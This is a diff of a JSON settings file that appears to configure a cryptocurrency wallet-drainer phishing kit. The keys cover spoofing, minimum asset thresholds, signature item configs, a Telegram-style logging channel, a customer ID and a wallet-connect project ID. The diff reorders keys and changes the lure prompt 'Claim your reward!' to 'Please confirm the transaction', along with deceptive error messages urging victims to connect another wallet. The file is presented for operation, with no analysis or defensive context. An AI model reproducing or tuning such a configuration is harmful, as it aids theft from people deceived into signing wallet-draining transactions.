@@ -1,9 +1,22 @@
 {
-  "SPOOF": "1000.0",
+  "SPOOF": "500",
+  "CRYPTO_PRIORITY": "1.7",
   "TRAFFIC": "crypto",
-  "SIG_FROM": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
-  "ASSET_MIN": "10",
+  "BUNDLES_7702": false,
+  "MODAL_AUTOOPEN": false,
+  "ASSET_MIN": "30",
+  "MODAL_STYLE": "0",
   "DARK_MODE": true,
+  "LOADING_MESSAGE": "Processing",
+  "CONFIRM_MESSAGE": "Please confirm the transaction",
+  "ERROR_MESSAGE": "Please connect another wallet",
+  "TX_RETRY_COUNT": "3",
+  "VERIFY_SIGNATURE": "0",
+  "LOGS_TO_THE_CHANNEL": "-1002753237744",
+  "FULL_LOG_URL": false,
+  "SIG_TEXT_ERROR": "An authorization error occurred",
+  "SIG_TEXT_PROMPT": "Please confirm the transaction",
+  "SIG_FROM": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
   "SIG_CONFIG": [
     {
       "itemType": 1,
@@ -11,19 +24,6 @@
       "amount": "500000000"
     }
   ],
-  "MODAL_STYLE": "0",
-  "BUNDLES_7702": false,
-  "FULL_LOG_URL": false,
-  "ERROR_MESSAGE": "Please connect another wallet",
-  "MODAL_AUTOOPEN": false,
-  "SIG_TEXT_ERROR": "An authorization error occurred",
-  "TX_RETRY_COUNT": "3",
-  "CONFIRM_MESSAGE": "Please confirm the transaction",
-  "CRYPTO_PRIORITY": "1.7",
-  "LOADING_MESSAGE": "Processing",
-  "SIG_TEXT_PROMPT": "Claim your reward!",
-  "VERIFY_SIGNATURE": "0",
-  "LOGS_TO_THE_CHANNEL": "-1002753237744",
   "CUSTOMER_ID": "A00A-1127-619E",
-  "REOWN_ID": "1d7ffe34ac8cf7b2a28d17efe7bc5b30"
+  "REOWN_ID": "4857e1bca55bd34ae787424db9e0ab18"
 }
